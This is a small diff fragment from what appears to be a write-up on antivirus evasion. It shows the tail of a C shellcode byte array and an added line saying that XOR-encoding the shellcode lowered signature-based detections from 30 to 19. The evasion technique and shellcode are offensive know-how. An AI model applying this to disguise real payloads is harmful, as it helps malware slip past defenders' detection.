@@ -33,6 +33,7 @@ unsigned char buf[] =
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
 
 ```
+Just by xoring the generated shellcode we bypassed some signature based detections, and we went from 30 detections to 19.
 
 Resources:
 
